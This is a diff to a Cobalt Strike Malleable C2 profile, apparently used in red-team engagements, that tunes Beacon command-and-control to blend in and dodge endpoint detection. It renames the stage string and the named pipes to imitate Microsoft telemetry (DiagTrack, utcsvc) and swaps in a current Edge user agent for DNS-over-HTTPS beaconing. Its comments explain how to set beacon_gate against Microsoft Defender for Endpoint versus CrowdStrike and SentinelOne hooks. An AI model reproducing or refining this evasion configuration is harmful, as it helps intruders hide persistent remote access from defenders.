@@ -1,4 +1,10 @@
-# Malleable C2 Profile - Modified for CS 4.13 / Beacon Booster compatible
+# Malleable C2 Profile - Azure Function redirector baseline
+# CS 4.13 / Beacon Booster compatible
+#
+# This is the canonical hardening baseline. Themed sub-profiles
+# (cloudflare_413, ganalytics_413, m365_exchange_413, onedrive_sync_413)
+# copy the stage {}, process-inject {}, post-ex {} hardening from here.
+# See references/profile-baseline.md for the baseline-vs-theme split.
 
 # Various options
 
@@ -14,7 +20,9 @@ set ssh_banner "OpenSSH_8.9p1 Ubuntu-3ubuntu0.6";
 set sleeptime "30000"; # default sleep in ms (30s)
 set jitter "37"; # Sleep jitter (0-99%)
 
-set ssh_pipename "postex_ssh_####";
+set killdate "20260916"; # Engagement end - beacon self-expires after this date
+
+set ssh_pipename "DiagTrack_ssh_####"; # Unique per-profile to prevent cross-attribution
 set tcp_frame_header "";
 set tcp_port "8443";
 
@@ -53,7 +61,7 @@ dns-beacon {
     set comm_mode "dns-over-https";
     dns-over-https {
         set doh_verb           "POST";
-        set doh_useragent      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)";
+        set doh_useragent      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
         set doh_proxy_server   "";
         set doh_server         "cloudflare-dns.com";
         set doh_accept         "application/dns-message";
@@ -131,7 +139,7 @@ http-get {
         metadata {
             mask;
             base64url;
-            prepend "x-]]ms-client-session=";
+            prepend "x-ms-client-session-id=";
             header "Cookie";
         }
     }
@@ -220,7 +228,7 @@ stage {
         # transform the x64 rDLL stage, same options as with x86
     }
 
-    stringw "I am not Beacon";
+    stringw "Microsoft Telemetry Client";
 
     set allocator "VirtualAlloc";  # Required for rdll_use_driploading
 
@@ -241,12 +249,12 @@ stage {
 
     # See: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-gate.htm
     # beacon_gate ignored when sleep_mask is set to false
-    # Comms only: masks HTTP APIs via obfuscated calls.
-    # Core APIs use syscall_method "Indirect" instead to bypass EDR hooks.
-    # beacon_gate All would override indirect syscalls with obfuscated calls for Core APIs,
-    # which gets caught by CrowdStrike/S1 hooks.
+    # All: masks all API groups (Comms + Core + Cleanup) via obfuscated calls.
+    # This is the MDE-tuned default - Beacon Booster's MDE hardening scanner
+    # flags anything less than All. Flip to Comms if the confirmed target is
+    # CrowdStrike Falcon or SentinelOne, which hook obfuscated calls.
     beacon_gate {
-      Comms;
+      All;
     }
 
     # Use embedded function pointer hints to bootstrap Beacon agent without
@@ -318,7 +326,7 @@ post-ex {
     set obfuscate "true";
 
     # change our post-ex output named pipe names...
-    set pipename "msrpc_####, win\\msrpc_###";
+    set pipename "DiagTrack_####, utcsvc_###"; # Azure/telemetry-themed, distinct from CS reference default
 
     # pass key function pointers from Beacon to its child jobs
     set smartinject "true";
